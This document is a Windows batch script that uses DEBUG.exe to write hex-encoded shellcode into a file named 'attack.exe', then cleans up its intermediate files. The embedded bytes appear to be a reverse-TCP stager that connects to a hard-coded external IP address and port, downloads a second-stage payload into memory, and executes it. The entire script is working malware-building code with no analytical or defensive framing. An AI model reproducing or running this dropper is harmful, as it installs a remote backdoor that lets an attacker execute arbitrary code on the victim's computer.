debug /?
if NOT %ERRORLEVEL% == 0 echo &echo &echo &echo **** **** **** **** ****&echo *** Missing DEBUG.exe ***&echo **** **** **** **** ****&exit /b
echo n attack.0>attack.hex
echo e 0100>>attack.hex
echo fc e8 8f 00 00 00 60 89 e5 31 d2 64 8b 52 30 8b 52 0c 8b 52 14 0f b7 4a 26 31 ff 8b 72 28 31 c0 ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 49 75 ef 52 8b 52 10 57 8b 42 3c 01 d0 8b 40 78 85 c0 74 4c 01 d0 50 8b 48 18 8b 58 20 01 d3 85 c9 74 3c 49 31 ff 8b 34 8b 01 d6 31 c0 ac c1 cf 0d 01 c7 38 e0 75 f4 03 7d f8 3b 7d 24 75 e0 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89>>attack.hex
echo e 0180>>attack.hex
echo 44 24 24 5b 5b 61 59 5a 51 ff e0 58 5f 5a 8b 12 e9 80 ff ff ff 5d 68 33 32 00 00 68 77 73 32 5f 54 68 4c 77 26 07 89 e8 ff d0 b8 90 01 00 00 29 c4 54 50 68 29 80 6b 00 ff d5 6a 0a 68 c1 a1 c1 63 68 02 00 dd 3a 89 e6 50 50 50 50 40 50 40 50 68 ea 0f df e0 ff d5 97 6a 10 56 57 68 99 a5 74 61 ff d5 85 c0 74 0a ff 4e 08 75 ec e8 67 00 00 00 6a 00 6a 04 56 57 68 02 d9 c8 5f ff d5 83 f8>>attack.hex
echo e 0200>>attack.hex
echo 00 7e 36 8b 36 6a 40 68 00 10 00 00 56 6a 00 68 58 a4 53 e5 ff d5 93 53 6a 00 56 53 57 68 02 d9 c8 5f ff d5 83 f8 00 7d 28 58 68 00 40 00 00 6a 00 50 68 0b 2f 0f 30 ff d5 57 68 75 6e 4d 61 ff d5 5e 5e ff 0c 24 0f 85 70 ff ff ff e9 9b ff ff ff 01 c3 29 c6 75 c1 c3 bb f0 b5 a2 56 6a 00 53 ff d5>>attack.hex
echo r cx>>attack.hex
echo 0180>>attack.hex
echo w>>attack.hex
echo q>>attack.hex
debug<attack.hex
move /Y attack.0 attack.exe
echo. >attack.hex
del /F /Q attack.hex attack.0
dir attack.exe

